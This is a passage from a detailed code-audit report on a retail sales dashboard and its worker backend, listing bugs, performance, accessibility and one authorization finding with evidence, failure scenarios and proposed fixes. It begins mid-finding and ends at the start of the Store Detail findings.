**Failure scenario.** On 2027-01-01 no 2027 rows load. Today has no budget row, currentWeek is 2026's last week, the hero budget shows '—', every card shows 'no budget', and Weekly/Monthly show $0 for every user until a deploy. Fixing only `to` then loads 2026 and 2027 rows with repeating week labels, so 'Week 1' sums both years in the Weekly card and Store Detail, and last-week navigation across the boundary breaks.

**Plan.** Future plan, frontend only, so there is no deploy ordering. (1) Ship now: derive the bounds from the ET year (from = `${y-1}-01-01`, to = `${y}-12-31`). This is safe on its own only if pre-2026 rows carry no week label; confirm read-only with `SELECT COUNT(*) FROM daily_sales WHERE date < '2026-01-01' AND week IS NOT NULL`. (2) Before December: replace label-keyed week filters with a date window (the Sun–Sat retail week containing the anchor date, via the existing ymdSundayOf), or with a per-row composite `${year}|${week}` key. That covers the Weekly card, getStoreMetrics, getLastWeekRows/allWeeks, the store-detail selectors and _asWeekTotals. Risk: the sheet's week must really be Sun–Sat (the comment at 8424 says it is). Verify with the stubbed browser probe: rows spanning 2026-12-20..2027-01-10 with repeated labels, clock set to 2027-01-02, and assert Weekly equals one week's sum.

<a id="dashboard-10"></a>
#### dashboard-10 — ?action=snapshot re-pulls any date with no backup or partial-fetch guard, and a one-click admin button runs it over 91 days for all stores

*high · major · bug · confidence high · `worker.js:18737` · unverified*

**Evidence.** The handler (worker.js:18737-18838) calls saveItemSalesSnapshot unconditionally (18813), which overwrites the KV items: snapshot, then fetchAggregateAndSnapshot. That function's only guards are manual-override, zero-order and negative-total (4734-4776). There is no BACKFILL_MIN_D1_RATIO check (rebuildItemSnapshot uses one at 2913) and no backup. Callers: index.html:6661 `<button onclick="runBackfillSales13w()">Backfill Last 13 Weeks</button>` with no confirm; 15674-15685 builds 91 dates back from today and POSTs `?action=snapshot&store=all&date=` for each; 16243 re-snapshots a month per store. This contradicts CLAUDE.md destructive rules 1, 2 and 4 and repeats the MEMORY.md BL4 incident (153 of 241 orders).

**Failure scenario.** A superuser clicks 'Backfill Last 13 Weeks'. The oldest dates sit at Clover's decaying retention edge. A day that returns 153 of 241 orders passes every guard (non-zero orders, positive total), overwrites D1 daily_sales and the items: KV snapshot, and the run reports success. Refunds that have aged out are dropped from every healthy date in the window.

**Plan.** Future plan. Frontend first, because removing or re-routing a caller works against either worker: remove the 13-week button, or make it consume repair-health output the way the Repair console does, and add uiConfirm plus a store/date summary to the month re-snapshot. Worker second, because it stops the old button's happy path: for date !== today, route ?action=snapshot through rebuildItemSnapshot (backup plus ratio guard), or return 409 pointing to repair-run. Risk: the SRR month-compare tool loses its fix button, so hand it the health-check flow. Verify with the worker harness: existing D1 total 3229.91 and stubbed Clover returning 60% of the orders; assert the D1 row and the items: KV are unchanged and a backup exists. Control: a genuinely short snapshot still gets repaired.

<a id="dashboard-3"></a>
#### dashboard-3 — Store-card Retry button is broken: unescaped JSON quotes terminate the onclick attribute

*medium · minor · bug · confidence high · `index.html:10163` · unverified*

**Evidence.** `onclick="event.stopPropagation();retryStore(${JSON.stringify(m.store)})"`: the double quotes from JSON.stringify end the attribute. The sibling View Details (10195) does `.replace(/"/g, '&quot;')`. Probe (BL4 history_d1 returns 500, range Yesterday): the button's attributes parsed as ["type","onclick","bl4","bl5","dupont\")\"","class"], with onclick = `event.stopPropagation();retryStore(`. Clicking it raises pageerror "Unexpected end of input" and sends zero requests.

**Failure scenario.** A store's D1 history fetch fails on a network blip. On any range other than Today the card shows "Couldn't load · Retry", and tapping Retry does nothing; only a full refresh recovers.

**Proposed fix.** `retryStore(${JSON.stringify(m.store).replace(/"/g, '&quot;')})`, the same as View Details.

<a id="dashboard-6"></a>
#### dashboard-6 — Hourly Snapshot chain budget omits BUDGET_ONLY_STORES (Holland), disagreeing with the hero and the push it was opened from

*medium · minor · bug · confidence high · `index.html:11652` · unverified*

**Evidence.** buildHourlyCard sums only `STORES.map(...)` via `if (budget > 0) chainBudget += budget;` (11649-11652). The hero adds `budgetOnlyTotal(r => r.date && r.date.toDateString() === todayDS)` (9196-9197), and the push (dispatchIntervalSummary) budgets over ALL_STORES (worker.js:8140). This site is missing from todo.md's list of seven Holland sites. Probe: overlay "/ $5,000.00" while the hero read "vs $6,000.00" for the same stub.

**Failure scenario.** The push headline and the dashboard hero both say the chain is at −31% of the day's budget (Holland's roughly $3.7k/day included). The snapshot the push opens shows the same sales against a smaller budget, e.g. −20%.

**Proposed fix.** After the rows map, add `chainBudget += budgetOnlyTotal(r => r.date && r.date.toDateString() === new Date().toDateString());`, mirroring 9196-9197. Pin it in scripts/test-closed-stores.mjs.

<a id="dashboard-11"></a>
#### dashboard-11 — LY pills/tiles and hourly sparklines have no staleness guard, so a slow response for an earlier range paints into the current cards

*medium · minor · bug · confidence high · `index.html:9809` · unverified*

**Evidence.** loadLYComparison: `const d = await cachedFetch(`…ly-sales&from=${from}&to=${to}`…); … dashLYByStore = byStore; for (const [code, ty] of Object.entries(dashCardLY)) fillLYPill(code, ty, …)`. dashCardLY was reset by the newer render (9973) while byStore belongs to the old range. loadStoreHourlySpark writes into `document.getElementById(elId)`, and elId `'v1-spark-' + code` (10123) is the same across renders. Probe: Today → Last 12 Months → Today within 100 ms left the range 'Today' with BL1 pill "$182,500.00 −99.5% LY" and dashLYByStore.BL1 = {retail:146000, bin:36500} (365 days).

**Failure scenario.** A user flips ranges quickly on a phone and the Today cards show '−99.5% LY' in red. Settings → Print reuses dashLYByStore, so the printout's LY column can come from the wrong range too. A slow sparkline for the previous day can also land in the new day's card.

**Proposed fix.** Add `let _dashRenderGen = 0;` and `const gen = ++_dashRenderGen` in renderCards, and pass gen into loadLYComparison(gen) and loadStoreHourlySpark(…, gen). After each await, `if (gen !== _dashRenderGen) return;` (and compare the range key before assigning dashLYByStore). About 8 lines.

<a id="dashboard-12"></a>
#### dashboard-12 — 'vs LY' on any range that includes today compares day-to-date against last year's full day(s)

*medium · minor · ui-ux · confidence medium · `index.html:10201` · unverified*

**Evidence.** The TY stash `dashCardLY[cardCode] = { net: v1Total, retail: v1Retail, bin: v1Bin }` includes today's live, partial figure (10084-10085, 10201). The LY side is `lyDateOf(dateRange.from) … lyDateOf(dateRange.to)` whole days from last_year_sales, which is daily only (9811-9812). The tooltip and comments deal only with auction, and nothing in tasks/ addresses the time of day.

**Failure scenario.** At 11am every store card shows something like '−78.0% LY' in red: two hours of trade against a full LY day. 'This Week' on a Wednesday compares three full days plus a partial against four full LY days. Managers read it as a collapse.

**Proposed fix.** When selIncludesToday(): for the single-day Today preset, hide the % (or show a neutral 'LY day $X'). For multi-day ranges, compare through yesterday on both sides: TY from stored rows only (m.aRetail + m.aBins), LY `to = lyDateOf(ymdShift(etTodayStr(), -1))`, and a 'thru yesterday' title. The change stays inside renderCards and loadLYComparison.

<a id="dashboard-13"></a>
#### dashboard-13 — A failed channel-split fetch renders as '0 orders' and is cached for the rest of the range

*medium · minor · bug · confidence high · `index.html:9580` · unverified*

**Evidence.** fetchStoreChannels swallows errors: `.then(add).catch(() => {})` (9580) and `.then(d => add(d && d.channels)).catch(() => {})` (9590). It therefore resolves with chZero(); loadDashChannel stores that (9683), and applyDashChannel paints `(d.orders || 0).toLocaleString('en-US')` = "0" with cart/items/asp '—'. The fallbacks at 9686/9755, which would restore the blended values, never run. channel-range also returns 400 above 366 days (worker.js:27628), and the custom picker has no maximum.

**Failure scenario.** A KV hiccup or a worker 500 on channel-range, or a 400-day custom range, leaves every card's Orders tile reading 0 next to a $45,000 Net. Combined with dashboard-1, a live-day failure stays at 0 all day.

**Proposed fix.** Make fetchStoreChannels reject when any job fails: remove the two `.catch(() => {})`, or set a failed flag and throw after Promise.all. The existing catch then falls back to the daily_sales-derived blended tiles. Optionally cap custom ranges at 366 days in rangeCalPick/rangeCustomApply.

<a id="dashboard-14"></a>
#### dashboard-14 — On Sunday before local noon the Weekly budget card (and Store Detail) drop today's live sales

*medium · minor · bug · confidence high · `index.html:8335` · unverified*

**Evidence.** currentWeek takes the latest row with `if (t <= now && t > currentWeekDate)` (8335), where t comes from dates built at local noon (`new Date(dateStr + "T12:00:00")`, 8080), so today's row only qualifies after 12:00. selectedWeek comes from weekForRangeEnd, which compares date strings (8507-8508). The weekly live boost is gated on `selectedWeek === currentWeek` (9126), and getStoreMetrics uses the same test (10310). Probe, Sunday 2026-09-27 10:30 ET: selectedWeek 109, currentWeek 108, Weekly "$0.00" while the hero read "$5,000.00". At 12:30 ET both were 109 and Weekly read "$5,000.00".

**Failure scenario.** Every Sunday morning, the first day of the retail week, the Weekly card shows $0 against the week's budget, and Store Detail shows no live week data until noon.

**Proposed fix.** Change line 8335 to `if (rowDayKey(r) <= etTodayStr() && t > currentWeekDate)`, a string compare against ET today like weekForRangeEnd uses.

<a id="dashboard-17"></a>
#### dashboard-17 — Cold 'Today' load makes 10 extra full Clover pulls (?action=items) that duplicate the live fetch

*medium · minor · performance · confidence high · `index.html:9589` · unverified*

**Evidence.** The first render runs after D1 lands and before live. fetchStoreChannels then falls back to `cachedFetch(`${WORKER_BASE}?action=items&store=${storeKey}`…)` when `liveCloverData[nm]?.channels` is missing, once from the hero (9674) and once per card (10219). cachedFetch (16867-16874) caches only completed responses, so each URL goes out twice. For today, ?action=items runs fetchItemOrders + refunds + the category map (worker.js:27899-27906), the same Clover work as the live endpoint, whose payload already carries `channels`. Probe cold-load counts: {"history_d1":6,"live":5,"items":10,"hourly":5,"ly-sales":1}.

**Failure scenario.** Every cold open of the dashboard makes 20 Clover order pulls (5 live + 10 items + 5 hourly) where 10 would do. That raises 429 risk, and with dashboard-2 a rate-limited store silently turns into 'No transactions yet'.

**Proposed fix.** (a) Add an in-flight map to cachedFetch (`_inflight.get(url) || promise`, deleted on settle) so concurrent identical GETs share one request. (b) In fetchStoreChannels, when live is expected but has not landed, await the in-flight Clover promise (store loadAll's cloverPromise on a module variable) instead of issuing ?action=items. Verify with the probe: items count 0.

<a id="dashboard-18"></a>
#### dashboard-18 — Refresh re-downloads about two years of D1 history for 6 stores just to update today's numbers

*medium · minor · performance · confidence high · `index.html:8239` · unverified*

**Evidence.** `if (force) { _apiCache.clear(); …` (8238-8239), followed by 6× history_d1 for 2025-01-01..2026-12-31 (8066): up to about 730 rows × 6 stores of `SELECT *` (roughly 1 MB of JSON). The page awaits sheetsPromise before repainting (8320). Probe after refresh: history_d1 6, live 5, hourly 5, ly-sales 1.

**Failure scenario.** Pull-to-refresh on a phone over LTE waits for the whole history download before anything repaints, and every refresh (and every double tap on ↻, which has no in-flight guard) repeats the D1 reads.

**Proposed fix.** On force, invalidate only the live-sensitive keys: invalidateApiCache('since='), ('action=items'), ('action=hourly'), ('action=channel-range'). Keep the history_d1 URLs unless the ET day changed since the last load. Guard dashRefresh against re-entry while a load is in flight. About 10 lines.

<a id="dashboard-21"></a>
#### dashboard-21 — ?action=daily-brief returns the chain-wide AI brief to store-scoped managers

*medium · minor · security · confidence high · `worker.js:21533` · unverified*

**Evidence.** The handler has no scope check (21530-21540), and its comment reads 'Any logged-in user; brief is chain-wide.' The brief is built from buildDailySummaryData for all stores plus computeStoreScores (5690-5697). Its siblings store-scores and ly-sales were scoped because of exactly this leak (21490-21497, 21517-21520). index.html no longer calls daily-brief. Harness: the BL1-only manager u-mgr1 got 200 with the stored chain brief text; staff got 403 NO_FINANCIAL_ACCESS.

**Failure scenario.** A single-store manager requests ?action=daily-brief&date=YYYY-MM-DD for any of the last 35 days and reads chain totals and other stores' performance.

**Proposed fix.** At the top of the handler: `if (!isAdminSecret && allowedStores(currentUser) !== null) return 403`. Alternatively, delete the endpoint, since nothing calls it. Worker only, and nothing in the frontend depends on it.

<a id="dashboard-22"></a>
#### dashboard-22 — At 393px the hero total and card Net are ellipsis-truncated on multi-week ranges, and channel tile values overflow their tiles

*medium · minor · ui-ux · confidence high · `index.html:1410` · unverified*

**Evidence.** The hero `#c-today-total … text-4xl sm:text-5xl … truncate` sits beside a flex-shrink-0 pace block. The card Net `text-[28px] … truncate` (10159) sits beside a fixed 104px sparkline (10129). Channel tiles use `px-3` in grid-cols-3 with text-sm values and no overflow handling (10131-10133). Probe at 393×852 (isMobile): This Month hero "$555,000.00" scrollWidth 243 vs clientWidth 201 (truncated); Last 12 Months hero "$9,105,000.00" 280 vs 201, card Net "$1,821,000.00" 218 vs 187, Retail tile "$1,456,800.00" 113 vs 70.

**Failure scenario.** A district manager checks 'This Month' on a phone and the hero reads '$555,00…', a cut-off dollar figure that reads as a different number, while tile values spill into their neighbours.

**Proposed fix.** Step the font down by string length instead of truncating. In renderDashboard, toggle `text-3xl` when the formatted total is longer than 10 characters and `text-2xl` when longer than 12, and drop `truncate`. Do the same for the card Net (22px above 10 characters). For tile values, drop cents at or above $100k, or allow `text-[13px]`. Re-run the 393px probe and assert scrollWidth <= clientWidth for all three.

<a id="dashboard-23"></a>
#### dashboard-23 — Contrast: LY chips (light and dark) and the OFFLINE pill (light) fail 4.5:1

*medium · minor · accessibility · confidence high · `index.html:9790` · unverified*

**Evidence.** fillLYPill and fillLYTile use inline `color:${up ? '#22c55e' : '#ef4444'}` on a 12% tint (9790, 9807). The OFFLINE pill uses `color:rgb(var(--op-inkDim))` (card 10150-10151, hero 9294-9300), and --op-* hold the DARK values on :root, so light mode paints #8893a7. Computed against the real composited ground: LY-up light 2.05:1, LY-down light 3.23:1, LY-down dark 4.25:1 (OLED 4.78, passes); OFFLINE light #8893a7 on #fff 3.10:1 (dark 5.74, OLED 8.33). The bell badge is white on #ef4444 at 3.76:1 and on #3b82f6 at 3.68:1 for 10.5px text.

**Failure scenario.** In light mode (and for 'down' in dark) the LY comparison and the OFFLINE state on every card are hard to read in a bright store or on a dim phone.

**Proposed fix.** Use the adaptive tokens this file already added for exactly this case (index.html:150-158): `color:var(--v1-good)` / `var(--v1-bad)` for LY text. That gives #166534 at 6.43:1 and #c0392b at 4.66:1 in light, and #22c55e / #f87171 (5.79:1) in dark; keep the tint and border hexes. For OFFLINE, add a `--v1-dim` pair (#6b6453 light, 5.88:1; rgb(var(--op-inkDim)) dark) and use it for the text. Re-compute in light, dark and OLED.

<a id="dashboard-19"></a>
#### dashboard-19 — Hourly sparkline costs one full Clover order pull per store per render, including immutable past dates

*medium · major · performance · confidence high · `worker.js:27403` · unverified*

**Evidence.** ?action=hourly calls `fetchCloverOrders(store, env, sinceTs, untilTs)` with no server cache (worker.js:27425). The client fetches it per card (index.html:10220) with a 5-minute client TTL. Past dates are recomputed from Clover every time, although item-hours: rollups are banked nightly (see backfill-item-hours at 27466+). The endpoint also sums `order.total - taxCents` (27447), not payment.amount with refunds and gift cards excluded, so the tooltip's hourly figures don't add up to the card's Net (a third pipeline for the same quantity; see MEMORY.md).

**Failure scenario.** Each range change or render past the TTL costs 5 Clover order pulls for a 104×44 decoration. For ranges ending more than 90 days ago the result is always empty (outside Clover retention), but the pull still happens.

**Plan.** (1) Worker only, backward compatible, deployable any time: for date < today serve from item-hours:<store>:<date> when present, otherwise cache the computed response in caches.default for 24h, after canAccessStore. (2) Frontend + worker: have the live handler also return `hours` (it already holds the day's elements) and read today's spark from liveCloverData. Deploy the worker first (an additive field), then the frontend. (3) Align the hourly net with aggregateOrders' definition. Verify: probe hourly count 0 for Today, and a harness assertion that sum(hours) equals aggregate.total within rounding.

<a id="dashboard-15"></a>
#### dashboard-15 — Weekly budget card omits today's auction (hero and Monthly include it)

*low · minor · bug · confidence high · `index.html:9117` · unverified*

**Evidence.** `const wk = sumRows(…filter(r => r.week === selectedWeek)); … if (wk.aAuction != null) tA += wk.aAuction;`. sumRows reads aAuction, which loadStoreFromD1 nulls on today's row (8097), and the live boost adds only `live.total - stale` (9132). Monthly uses rowAuction per row (9429-9430), and the hero uses rowAuction(todayRow) (9189). scripts/test-today-auction-reads.mjs allowlists `wk.aAuction` as 'a sumRows RESULT', so it cannot catch this.

**Failure scenario.** When today's auction is entered through manual override (todo.md counts 52 such rows), the hero and Monthly include it but Weekly does not, so the budget cards disagree by the auction amount.

**Proposed fix.** In the `if (selectedWeek === currentWeek)` loop (9127-9133), after the live boost add `tA += rowAuction(todayRow) ?? 0;`. todayRow is already looked up there.

<a id="dashboard-16"></a>
#### dashboard-16 — Budget card: 'days left' always counts the current month; variance loses its alignment; a zero-budget delta is painted red

*low · minor · ui-ux · confidence high · `index.html:9488` · unverified*

**Evidence.** `const daysLeft = Math.max(0, new Date(tp[0], tp[1], 0).getDate() - tp[2]);` is computed from todayStr whatever refDate is (9487-9490), so Last Month renders 'Monthly · Aug … $X remaining · 8 days left'. `el("c-variance").className = `text-xs font-semibold mt-1 ${wkCls}`` (9403, and 9460 for the month) replaces the markup's `ml-auto text-sm font-bold` (1522), so the variance jumps left next to the budget. On the card, `v1Ahead = v1HasBudget && v1Total >= v1Budget` (10103), so with a $0 budget a '+$X vs $0.00' delta renders in the bad colour (10167).

**Failure scenario.** Someone reviewing Last Month reads '8 days left' and a 'remaining' figure for a closed month, and the weekly and monthly variance jumps around between renders.

**Proposed fix.** Only compute days-left/remaining when refMonth is today's ET month (otherwise show 'Month closed' or omit it). Use classList.toggle for the variance colour instead of assigning className. Colour the card delta by `v1Delta >= 0` when the budget is 0.

<a id="dashboard-20"></a>
#### dashboard-20 — saveSnapshot attempts ALTER TABLE on every live fetch

*low · minor · performance · confidence high · `worker.js:4640` · unverified*

**Evidence.** `try { await env.DB.prepare('ALTER TABLE daily_sales ADD COLUMN avg_asp REAL').run(); } catch {}` runs on each of the 5 live calls per dashboard load or refresh. The column exists: migration-013.sql adds it, the INSERT two lines later writes avg_asp, and history_d1 reads row.avg_asp.

**Failure scenario.** Every dashboard open sends 5 failing DDL statements to D1 ahead of the real write: wasted round-trips, and a schema statement on a hot path.

**Proposed fix.** Delete the line. Worker only; the column is captured by migration-013.

<a id="dashboard-24"></a>
#### dashboard-24 — Keyboard: role=button divs don't respond to Enter/Space, and the custom calendar, budget toggle and notification rows are bare divs

*low · minor · accessibility · confidence high · `index.html:1451` · unverified*

**Evidence.** `<div id="cm-retail-col" role="button" tabindex="0" onclick="setDashChannel('retail')">` (1451, BIN at 1455) and the card chTile `role="button" tabindex="0" onclick="setCardChannel(…)"` (10133) have no keydown handler; the only Enter/Space handlers in the file are elsewhere (30553, 30568). No aria-pressed conveys the active filter. Calendar days are `<div onclick="rangeCalPick('…')">` (8616) and not focusable. The budget summary is `<div … onclick="toggleBudget()">` (1496, 1511) with no role, tabindex or aria-expanded. Notification rows are `<div … onclick="notifRowClick(…)">` (8965-8966).

**Failure scenario.** A keyboard user can tab to the Retail/BIN filter but cannot activate it, cannot pick a custom date range at all, and cannot open the mobile budget detail or a notification row.

**Proposed fix.** Make these `<button type="button">` elements: the channel columns and tiles, calendar cells (with aria-label set to the date), the budget summary (with aria-expanded toggled in toggleBudget) and notification rows. Alternatively add one delegated keydown for `[role=button]` Enter/Space. Set aria-pressed in applyDashChannel and applyCardChannel.

<a id="dashboard-25"></a>
#### dashboard-25 — Tap targets below DESIGN §9's 40px minimum on the phone

*low · minor · ui-ux · confidence high · `index.html:10195` · unverified*

**Evidence.** Measured at 393px: the card 'View Details →' is 98×16px (a text-xs link with no padding), yet DESIGN §9 names View Details among the ≥40px targets. The hero More toggle is 73×31, and the header bell and day chip are 38px tall. The notification dismiss is `w-[22px] h-[22px]` (8973). Custom-calendar navigation is `w-7 h-7` (28px, 1370/1373) and day cells are `h-8`.

**Failure scenario.** On the most-used page, a manager on the sales floor misses 'View Details' or taps the pace bar instead, and dismissing a notification needs precise aim.

**Proposed fix.** Give View Details `inline-flex items-center min-h-[44px] px-2 -mr-2`; the More toggle `py-2.5`; and the bell, chip and dismiss a 44px hit area via padding or a pseudo-element, keeping the visual size.

<a id="dashboard-26"></a>
#### dashboard-26 — On multi-day ranges the sparkline shows only the last day, with no label

*low · minor · ui-ux · confidence high · `index.html:10128` · unverified*

**Evidence.** `const v1SparkDate = dateRange.to;   // hourly spark = last day of the range` and nothing on the card says so. Last Month shows Aug 31's hours beside a month Net. Last Year points at Dec 31 2025, which is outside Clover's ~90-day retention, so it is always empty but still costs a pull. The tooltip prints 2-decimal dollars (7740), while DESIGN §8 says whole dollars.

**Failure scenario.** A user reads the curve on a 'This Month' card as the month's trend. It is one day's hours.

**Proposed fix.** Render the spark only when from === to, or when the range includes today with a small 'Today · hourly' caption. Otherwise leave the slot empty or draw a daily series from allStoreData, which is already in memory and needs no fetch. This also saves 5 Clover pulls per range change. Use Math.round in the tooltip.

<a id="dashboard-27"></a>
#### dashboard-27 — Refresh swaps every real card for off-token gray skeletons, so the page jumps

*low · minor · ui-ux · confidence high · `index.html:8207` · unverified*

**Evidence.** loadAll calls renderSkeletonCards() on every call, including pull-to-refresh and ↻ (8271). The skeleton chrome is `bg-white dark:bg-gray-800 rounded-xl p-5 shadow-sm border-gray-200 dark:border-gray-700 animate-pulse` (8209), versus the V1 card's `bg-opl-panel dark:bg-op-panel rounded-card` with no shadow (DESIGN §2.4 'Shadows: none'; §6 Loading = .skel inside normal chrome). The skeleton is also much shorter than a real card.

**Failure scenario.** A user scrolled to the fourth card pulls to refresh. The page collapses to short gray boxes (a different radius and colour, with a shadow), the scroll position jumps, and then the page re-expands.

**Proposed fix.** Only render skeletons when #store-cards is empty (first load). On refresh, keep the cards and let the existing v1Loading `.skel` state show inside them. Restyle the first-load skeleton with V1 tokens and card height.

<a id="dashboard-28"></a>
#### dashboard-28 — Dead code in scope, including work loadAll repeats on every load

*low · minor · code-quality · confidence high · `index.html:8023` · unverified*

**Evidence.** Never called: loadStore and fetchJSONP (Google Sheets JSONP that injects a <script> from docs.google.com, 8004-8062), fetchHistoricalCloverData (8162), getWeekDateRange (8173), fetchCloverForRange (8187), loadHistoricalCloverForWeek (8202), storeTrend (7657; DESIGN §11 calls it dead), dismissAllCritical (9034, the strip is removed), and the disabled score-ring block (10237-10304). loadAll still precomputes weeklyTotalsCache for storeTrend on every load (8345-8351: STORES × allWeeks × a filter over every row).

**Failure scenario.** Every load or refresh spends CPU on a cache nothing reads. The dormant JSONP loader and the stale helpers invite someone to wire the old Sheets path back in.

**Proposed fix.** Delete these functions and the weeklyTotalsCache precompute, about 200 lines with no behaviour change. If the score ring is to be revived, keep loadStoreScores/applyStoreScores/renderScoreBadge behind a clearly named flag; otherwise remove them.

</details>

<a id="store-detail"></a>
### Store Detail + All Stores Detail

Store Detail and All Stores Detail are mostly careful work. Transactions is the strongest part: it refuses days it can't serve and says why (retention wall, cutover, incomplete fetch, missing endpoint), escapes every Clover string, and its §4.8 styles were contrast-checked. I found no XSS in scope. The biggest risks are wrong numbers. (1) Every async loader (Transactions, Item Sales on both pages, the hourly modals) paints whichever response arrives last, so a slow live Clover read can paint another store's or another day's data. I proved this by running the real functions in node. (2) On the current week, the store hero shows today-only Channel Mix and Orders under a "This Week" label and compares them with last week's week-to-date totals (Orders "LW ↓87.5%" on a Tuesday). (3) The All Stores page leaves auction out of its hero, store list and chart, while the dashboard card that opens it includes auction. (4) Mid-week, the chart cards compare this week so far with the whole of last week ("vs Last Week −66.1%" on a Tuesday). (5) The week-view Item Sales caches are not tied to the week on screen, so drilling in, re-sorting or reopening the week view can show a different week's figures. On the worker side, the live items read and the refunds/credits reads turn a failed Clover page into an empty result, and the UI then reports that empty result as a real reading; the transactions case was reproduced through the real worker. Other gaps: back navigation leaves the Android history stack out of sync, pull-to-refresh never repaints All Stores or reloads Transactions, the Transactions table jumps back to its top on every row click, clickable rows can't be reached by keyboard, and several light-theme colours fail 4.5:1 (comparison badges 3.03/3.46, the OFFLINE pill 2.80). One risk I could not check: the page filters rows with `r.week === selectedWeek` while loading D1 history from 2025-01-01, and the worker notes that week numbers restart every January. If 2025 rows reuse 2026's week numbers, those filters merge the two years, which a single read-only D1 query would settle.

| ID | Sev | Size | Category | Finding | Where | Verified |
|---|---|---|---|---|---|---|
| [store-detail-1](#store-detail-1) | high | minor | bug | Current-week hero: Channel Mix and Matrix show TODAY's live figures under a 'This Week' label and compare them with last week's week-to-date totals | `index.html:11383` | unverified |
| [store-detail-2](#store-detail-2) | high | minor | bug | All Stores page leaves auction out of its hero, By-Store rows and chart, but its budgets and the dashboard card that opens it include auction | `index.html:14535` | unverified |
| [store-detail-3](#store-detail-3) | high | minor | bug | Transactions: a slow response for the previous store or day overwrites the newer selection | `index.html:14159` | unverified |
| [store-detail-4](#store-detail-4) | high | minor | bug | Item Sales (both pages): switching day or store while a load is in flight lets the older response overwrite the table | `index.html:13707` | unverified |
| [store-detail-5](#store-detail-5) | high | minor | bug | Chart cards compare this week so far with the whole of last week, last year and the budget ('vs Last Week −66%' every Tuesday) | `index.html:10965` | unverified |
| [store-detail-6](#store-detail-6) | high | minor | bug | Week-view Item Sales caches are not tied to the week on screen: All Stores reopens an old week, and store-detail drill/sort picks the first cached week | `index.html:14925` | unverified |
| [store-detail-7](#store-detail-7) | medium | minor | bug | Worker items (live today): a failed Clover page is served as an empty day and the UI says 'No item sales data for today yet'; items-hour reports it as 'Store keys not found' | `worker.js:27912` | unverified |
| [store-detail-8](#store-detail-8) | medium | minor | bug | Transactions endpoint (and archive banking) turn a failed refunds/credits fetch into 'zero refunds'; the UI then says it is a real reading | `worker.js:1751` | unverified |
| [store-detail-9](#store-detail-9) | medium | minor | bug | All Stores Items silently drops any store whose fetch failed and caches the partial chain total | `index.html:14961` | unverified |
| [store-detail-10](#store-detail-10) | medium | minor | bug | Hourly modals: a late response paints over a newer day, and a request finishing after close builds a chart into the hidden modal | `index.html:11078` | unverified |
| [store-detail-11](#store-detail-11) | medium | minor | bug | Hourly modal for a day older than Clover's ~90-day window shows 'This Day $0.00', a flat chart and a $0 Last Week | `index.html:11074` | unverified |
| [store-detail-12](#store-detail-12) | medium | minor | bug | Refresh gaps: All Stores never repaints after a refresh, pull-to-refresh on Transactions reuses the cached list, and every in-place rerender resets the Item Sales drill and closes the open transaction | `index.html:8312` | unverified |
| [store-detail-13](#store-detail-13) | medium | minor | bug | The header back chevron never pops the history entry the detail pages push, so Android back re-opens previously visited detail pages or does nothing | `index.html:1565` | unverified |
| [store-detail-14](#store-detail-14) | medium | minor | ui-ux | Transactions: every row click re-renders the whole table, resetting its internal scroll to the top, and the detail drawer opens below the 62vh table, off-screen on a phone | `index.html:14124` | unverified |
| [store-detail-15](#store-detail-15) | medium | minor | accessibility | Clickable rows (item categories on both pages, All Stores store rows, transaction rows) are not keyboard-focusable and have no light-theme hover | `index.html:14030` | unverified |
| [store-detail-16](#store-detail-16) | medium | minor | bug | Charts: the This Week line plots future days as $0, and the y-axis loses beginAtZero on every re-render | `index.html:10943` | unverified |
| [store-detail-17](#store-detail-17) | medium | minor | accessibility | LW/LY comparison badges fail contrast in light theme (3.03 and 3.46:1), their 'LW'/'LY' labels fail in both themes (1.92–2.76:1), and they render at 8px | `index.html:7966` | unverified |
| [store-detail-18](#store-detail-18) | medium | minor | ui-ux | Item Sales and Transactions ignore the week the page is showing: they default to today, selectedTxnDate carries over between stores, and selectedItemDate survives a week change | `index.html:13916` | unverified |
| [store-detail-19](#store-detail-19) | low | minor | ui-ux | Segmented tabs are 31px tall with no nowrap or tab semantics; 'Item Sales' wraps at narrow widths | `index.html:1586` | unverified |
| [store-detail-20](#store-detail-20) | low | minor | accessibility | OFFLINE pill text is #8893a7 in light theme: 2.80:1 on the hero's green corner, 3.10:1 on white | `index.html:11428` | unverified |
| [store-detail-21](#store-detail-21) | low | minor | ui-ux | Month/week selects and the sort select are 11.5–12px, so iOS zooms the page on focus | `index.html:10401` | unverified |
| [store-detail-22](#store-detail-22) | low | minor | accessibility | Hourly modals lack dialog semantics and focus management, have a 32px close button, and can only be opened by tapping a canvas point | `index.html:7386` | unverified |
| [store-detail-23](#store-detail-23) | low | minor | accessibility | Charts aren't redrawn on a theme change, and the light-theme TODAY label and budget line fail contrast | `index.html:10856` | unverified |
| [store-detail-24](#store-detail-24) | low | minor | performance | Worker ?action=hourly downloads a full day of orders with line items just to build 24 totals, twice per modal open | `worker.js:27425` | unverified |
| [store-detail-25](#store-detail-25) | low | minor | performance | Week-view Item Sales refetches every day, including days already cached; All Stores fires 35 concurrent requests | `index.html:13650` | unverified |
| [store-detail-26](#store-detail-26) | low | minor | ui-ux | Negative amounts render as '$-4.00' in Transactions and Item Sales instead of the app's '−$4.00' | `index.html:14344` | unverified |
| [store-detail-27](#store-detail-27) | low | minor | performance | Worker ?action=weekly-store-detail has no date-range cap: one KV read per day can exceed the ~1,000-subrequest limit | `worker.js:20537` | unverified |
| [store-detail-28](#store-detail-28) | low | minor | ui-ux | Daily tab's month/week picker changes only the Daily table; the header, hero, Chart, Items and Transactions stay on the dashboard week | `index.html:10463` | unverified |

<details><summary>Details: evidence, failure scenario, proposed fix</summary>

<a id="store-detail-1"></a>
#### store-detail-1 — Current-week hero: Channel Mix and Matrix show TODAY's live figures under a 'This Week' label and compare them with last week's week-to-date totals

*high · minor · bug · confidence high · `index.html:11383` · unverified*

